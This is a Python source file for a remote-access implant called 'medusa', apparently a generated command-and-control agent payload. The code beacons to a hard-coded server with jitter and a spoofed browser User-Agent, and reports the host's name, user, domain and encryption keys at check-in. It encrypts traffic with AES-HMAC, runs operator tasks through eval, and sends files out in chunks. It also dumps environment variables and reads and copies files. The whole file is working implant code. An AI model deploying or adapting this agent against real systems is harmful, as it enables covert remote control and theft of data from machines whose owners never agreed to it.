import os, random, sys, json, socket, base64, time, platform, ssl
import threading, urllib2
from datetime import datetime
from Queue import Queue

CHUNK_SIZE = 51200

class medusa:
    def encrypt(self, data):
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives import hashes, hmac, padding
        from cryptography.hazmat.backends import default_backend

        if not self.agent_config["enc_key"]["value"] == "none" and len(data)>0:
            key = base64.b64decode(self.agent_config["enc_key"]["enc_key"])
            iv = os.urandom(16)

            backend = default_backend()
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend)
            encryptor = cipher.encryptor()

            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(data)
            padded_data += padder.finalize()

            ct = encryptor.update(padded_data) + encryptor.finalize()

            h = hmac.HMAC(key, hashes.SHA256(), backend)
            h.update(iv + ct)
            hmac = h.finalize()

            output = iv + ct + hmac
            return output
        else:
            return data

    def decrypt(self, data):
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives import hashes, hmac, padding
        from cryptography.hazmat.backends import default_backend

        if not self.agent_config["enc_key"]["value"] == "none":
            if len(data)>0:
                backend = default_backend()

                key = base64.b64decode(self.agent_config["enc_key"]["dec_key"])
                uuid = data[:36]
                iv = data[36:52]
                ct = data[52:-32]
                received_hmac = data[-32:]

                h = hmac.HMAC(key, hashes.SHA256(), backend)
                h.update(iv + ct)
                hmac = h.finalize()

                if base64.b64encode(hmac) == base64.b64encode(received_hmac):
                    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend)
                    decryptor = cipher.decryptor()
                    pt = decryptor.update(ct) + decryptor.finalize()
                    unpadder = padding.PKCS7(128).unpadder()
                    decrypted_data = unpadder.update(pt)
                    decrypted_data += unpadder.finalize()
                    return (uuid+decrypted_data).decode()
                else: return ""
            else: return ""
        else:
            return data.decode()


    def getOSVersion(self):
        if platform.mac_ver()[0]: return "macOS "+platform.mac_ver()[0]
        else: return platform.system() + " " + platform.release()

    def getUsername(self):
        try: return os.getlogin() 
        except: pass
        for k in [ "USER", "LOGNAME", "USERNAME" ]: 
            if k in os.environ.keys(): return os.environ[k]
    
    def formatMessage(self, data):
        return base64.b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))

    def formatResponse(self, data):
        return json.loads(data.replace(self.agent_config["UUID"],""))

    def postMessageAndRetrieveResponse(self, data):
        return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data),'POST')))

    def getMessageAndRetrieveResponse(self, data):
        return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data))))

    def sendTaskOutputUpdate(self, task_id, output):
        responses = [{ "task_id": task_id, "user_output": output, "completed": False }]
        message = { "action": "post_response", "responses": responses }
        response_data = self.postMessageAndRetrieveResponse(message)

    def postResponses(self):
        try:
            responses = []
            socks = []
            taskings = self.taskings
            for task in taskings:
                if task["completed"] == True:
                    out = { "task_id": task["task_id"], "user_output": task["result"], "completed": True }
                    if task["error"]: out["status"] = "error"
                    for func in ["processes", "file_browser"]: 
                        if func in task: out[func] = task[func]
                    responses.append(out)
            while not self.socks_out.empty(): socks.append(self.socks_out.get())
            if ((len(responses) > 0) or (len(socks) > 0)):
                message = { "action": "post_response", "responses": responses }
                if socks: message["socks"] = socks
                response_data = self.postMessageAndRetrieveResponse(message)
                for resp in response_data["responses"]:
                    task_index = [t for t in self.taskings \
                        if resp["task_id"] == t["task_id"] \
                        and resp["status"] == "success"][0]
                    self.taskings.pop(self.taskings.index(task_index))
        except: pass
        
    def processTask(self, task):
        try:
            task["started"] = True
            function = getattr(self, task["command"], None)
            if(callable(function)):
                try:
                    params = json.loads(task["parameters"]) if task["parameters"] else {}
                    params['task_id'] = task["task_id"] 
                    command =  "self." + task["command"] + "(**params)"
                    output = eval(command)
                except Exception as error:
                    output = str(error)
                    task["error"] = True                        
                task["result"] = output
                task["completed"] = True
            else:
                task["error"] = True
                task["completed"] = True
                task["result"] = "Function unavailable."
        except Exception as error:
            task["error"] = True
            task["completed"] = True
            task["result"] = error

    def processTaskings(self):
        threads = list()       
        taskings = self.taskings     
        for task in taskings:
            if task["started"] == False:
                x = threading.Thread(target=self.processTask, name="{}:{}".format(task["command"], task["task_id"]), args=(task,))
                threads.append(x)
                x.start()

    def getTaskings(self):
        data = { "action": "get_tasking", "tasking_size": -1 }
        tasking_data = self.postMessageAndRetrieveResponse(data)
        for task in tasking_data["tasks"]:
            t = {
                "task_id":task["id"],
                "command":task["command"],
                "parameters":task["parameters"],
                "result":"",
                "completed": False,
                "started":False,
                "error":False,
                "stopped":False
            }
            self.taskings.append(t)
        if "socks" in tasking_data:
            for packet in tasking_data["socks"]: self.socks_in.put(packet)

    def checkIn(self):
        data = {
            "action": "checkin",
            "ip": socket.gethostbyname(socket.gethostname()),
            "os": self.getOSVersion(),
            "user": self.getUsername(),
            "host": socket.gethostname(),
            "domain:": socket.getfqdn(),
            "pid": os.getpid(),
            "uuid": self.agent_config["PayloadUUID"],
            "architecture": "x64" if sys.maxsize > 2**32 else "x86",
            "encryption_key": self.agent_config["enc_key"]["enc_key"],
            "decryption_key": self.agent_config["enc_key"]["dec_key"]
        }
        encoded_data = base64.b64encode(self.agent_config["PayloadUUID"].encode() + self.encrypt(json.dumps(data).encode()))
        decoded_data = self.decrypt(self.makeRequest(encoded_data, 'POST'))
        if("status" in decoded_data):
            UUID = json.loads(decoded_data.replace(self.agent_config["PayloadUUID"],""))["id"]
            self.agent_config["UUID"] = UUID
            return True
        else: return False

    def makeRequest(self, data, method='GET'):
        hdrs = {}
        for header in self.agent_config["Headers"]:
            hdrs[header["name"]] = header["value"]
  
        if method == 'GET':
            req = urllib2.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["GetURI"] + "?" + self.agent_config["GetURI"] + "=" + data.decode(), None, hdrs)
        else:
            req = urllib2.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["PostURI"], data, hdrs)
        
        if self.agent_config["ProxyHost"] and self.agent_config["ProxyPort"]:
            tls = "https" if self.agent_config["ProxyHost"][0:5] == "https" else "http"
            handler = urllib2.HTTPSHandler if tls else urllib2.HTTPHandler
            if self.agent_config["ProxyUser"] and self.agent_config["ProxyPass"]:
                proxy = urllib2.ProxyHandler({
                    "{}".format(tls): '{}://{}:{}@{}:{}'.format(tls, self.agent_config["ProxyUser"], self.agent_config["ProxyPass"], \
                        self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
                })
                auth = urllib2.HTTPBasicAuthHandler()
                opener = urllib2.build_opener(proxy, auth, handler)
            else:
                proxy = urllib2.ProxyHandler({
                    "{}".format(tls): '{}://{}:{}'.format(tls, self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
                })
                opener = urllib2.build_opener(proxy, handler)
            urllib2.install_opener(opener)
        try:
            out = base64.b64decode(urllib2.urlopen(req).read())
            return out.decode() if method == 'GET' else out
        except: return ""

    def passedKilldate(self):
        kd_list = [ int(x) for x in self.agent_config["KillDate"].split("-")]
        kd = datetime(kd_list[0], kd_list[1], kd_list[2])
        now = datetime.now()
        if now >= kd: return True
        else: return False

    def agentSleep(self):
        j = 0
        if int(self.agent_config["Jitter"]) > 0:
            v = float(self.agent_config["Sleep"]) * (float(self.agent_config["Jitter"])/100)
            if int(v) > 0:
                j = random.randrange(0, int(v))    
        time.sleep(self.agent_config["Sleep"]+j)

    def eval_code(self, task_id, command):
        return eval(command)
        
    def exit(self, task_id):
        os._exit(0)

    def cwd(self, task_id):
        return self.current_directory
        
    def download(self, task_id, file):
        file_path = file if file[0] == os.sep \
                else os.path.join(self.current_directory,file)

        file_size = os.stat(file_path).st_size 
        total_chunks = int(file_size / CHUNK_SIZE) + (file_size % CHUNK_SIZE > 0)

        data = {
            "action": "post_response", 
            "responses": [
            {
                "task_id": task_id,
                "total_chunks": total_chunks,
                "full_path": file_path,
                "chunk_size": CHUNK_SIZE
            }]
        }
        initial_response = self.postMessageAndRetrieveResponse(data)
        chunk_num = 1
        with open(file_path, 'rb') as f:
            while True:
                if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                    return "Job stopped."

                content = f.read(CHUNK_SIZE)
                if not content:
                    break # done

                data = {
                    "action": "post_response", 
                    "responses": [
                        {
                            "chunk_num": chunk_num,
                            "chunk_data": base64.b64encode(content).decode(),
                            "task_id": task_id,
                            "file_id": initial_response["responses"][0]["file_id"],
                            "user_output": { 
                                "agent_file_id": initial_response["responses"][0]["file_id"], 
                                "filename": file,
                                "total_chunks": total_chunks
                            }
                        }
                    ]
                }
                chunk_num+=1
                response = self.postMessageAndRetrieveResponse(data)

    def cd(self, task_id, path):
        if path == "..":
            self.current_directory = os.path.dirname(os.path.dirname(self.current_directory + os.sep))
        else:
            self.current_directory = path if path[0] == os.sep \
                else os.path.abspath(os.path.join(self.current_directory,path))

    def cat(self, task_id, path):
        file_path = path if path[0] == os.sep \
                else os.path.join(self.current_directory,path)
        
        with open(file_path, 'r') as f:
            content = f.readlines()
            return ''.join(content)

    def env(self, task_id):
        return "\n".join(["{}: {}".format(x, os.environ[x]) for x in os.environ])
 
    def cp(self, task_id, source, destination):
        import shutil

        source_path = source if source[0] == os.sep \
                else os.path.join(self.current_directory,source)

        dest_path = destination if destination[0] == os.sep \
                else os.path.join(self.current_directory,destination)

        if os.path.isdir(source_path):
            shutil.copytree(source_path, dest_path)
        else:
            shutil.copy(source_path, dest_path)



    def __init__(self):
        self.socks_open = {}
        self.socks_in = Queue()
        self.socks_out = Queue()
        self.taskings = []
        self._meta_cache = {}
        self.moduleRepo = {}
        self.current_directory = os.getcwd()
        self.agent_config = {
            "Server": "http://10.0.2.15",
            "Port": "80",
            "PostURI": "/data",
            "PayloadUUID": "e2ebb0f1-3aae-4a30-a440-021c1508b14f",
            "UUID": "",
            "Headers": [{"name": "User-Agent", "key": "User-Agent", "value": "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"}],
            "Sleep": 10,
            "Jitter": 23,
            "KillDate": "2023-03-22",
            "enc_key": {"value": "aes256_hmac", "enc_key": "5YZjEAOogJYnEX9Xi2gxc0FuLPjNyelptDdfpfwFSXo=", "dec_key": "5YZjEAOogJYnEX9Xi2gxc0FuLPjNyelptDdfpfwFSXo="},
            "ExchChk": "T",
            "GetURI": "/index",
            "GetParam": "q",
            "ProxyHost": "",
            "ProxyUser": "",
            "ProxyPass": "",
            "ProxyPort": "",
        }

        while(True):
            if(self.agent_config["UUID"] == ""):
                self.checkIn()
                self.agentSleep()
            else:
                while(True):
                    if self.passedKilldate():
                        self.exit()
                    try:
                        self.getTaskings()
                        self.processTaskings()
                        self.postResponses()
                    except: pass
                    self.agentSleep()                   

if __name__ == "__main__":
    medusa = medusa()
